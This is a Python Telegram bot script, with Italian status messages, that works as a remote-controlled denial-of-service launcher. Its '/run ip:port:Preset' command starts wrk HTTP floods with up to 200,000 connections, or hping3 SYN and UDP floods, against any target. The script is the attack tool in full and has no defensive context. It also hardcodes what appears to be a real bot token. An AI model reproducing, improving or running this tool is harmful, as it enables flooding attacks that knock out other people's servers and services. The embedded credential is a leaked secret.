#!/usr/bin/env python3
from telegram.ext import Updater, CommandHandler
import subprocess
import os
import signal
import time

# ---------- CONFIG ----------
TOKEN = "8570385678:AAFQvkg_W2wAbGnaUOWhZLirmwXdP5RzgPI"
AUTHORIZED_ID = 6972302166
MAX_TIME = 600
# ---------------------------

process = None
start_time = None

# ---------- Presets ----------
L7_PRESETS = {
    "Flood": {
        "bin": "wrk",
        "flags": "-t16 -c100000 -d4m"
    },
    "Aggressive": {
        "bin": "wrk",
        "flags": "-t30 -c200000 -d4m"
    }
}

L4_PRESETS = {
    "Default": {
        "cmd": "hping3",
        "args": "{ip} -S -p {port} -d 50000 --flood"
    },
    "Fast": {
        "cmd": "hping3",
        "args": "{ip} -2 -p {port} -d 64 --flood"
    }
}
# ---------------------------

def stop_process():
    global process
    if process and process.poll() is None:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    process = None

def build_command(target):
    try:
        a, b, preset = target.split(":")
    except ValueError:
        return None

    # ---- L4 ----
    if preset in L4_PRESETS:
        p = L4_PRESETS[preset]
        args = p["args"].format(ip=a, port=b).split()
        return [p["cmd"], *args]

    # ---- L7 ----
    if preset in L7_PRESETS:
        p = L7_PRESETS[preset]
        url = f"http://{a}:{b}"
        return [p["bin"], *p["flags"].split(), url]

    return None

# ---------- Commands ----------

def run(update, context):
    global process, start_time

    if update.effective_user.id != AUTHORIZED_ID:
        return

    if process and process.poll() is None:
        update.message.reply_text("⚠️ Processo già attivo")
        return

    if not context.args:
        update.message.reply_text("Formato: /run ip|url:port:Preset")
        return

    cmd = build_command(context.args[0])
    if not cmd:
        update.message.reply_text("❌ Preset o formato non valido")
        return

    process = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid
    )
    start_time = time.time()
    update.message.reply_text("▶️ Avviato")

def stop(update, context):
    if update.effective_user.id != AUTHORIZED_ID:
        return
    stop_process()
    update.message.reply_text("⛔ Fermato")

def status(update, context):
    global process, start_time

    if update.effective_user.id != AUTHORIZED_ID:
        return

    if process and process.poll() is None:
        elapsed = int(time.time() - start_time)
        if elapsed >= MAX_TIME:
            stop_process()
            update.message.reply_text("⏱️ Timeout raggiunto – terminato")
        else:
            update.message.reply_text(f"🟢 Attivo ({elapsed}s)")
    else:
        update.message.reply_text("🔴 Fermo")

# ---------- Main ----------

def main():
    updater = Updater(TOKEN)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("run", run))
    dp.add_handler(CommandHandler("stop", stop))
    dp.add_handler(CommandHandler("status", status))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
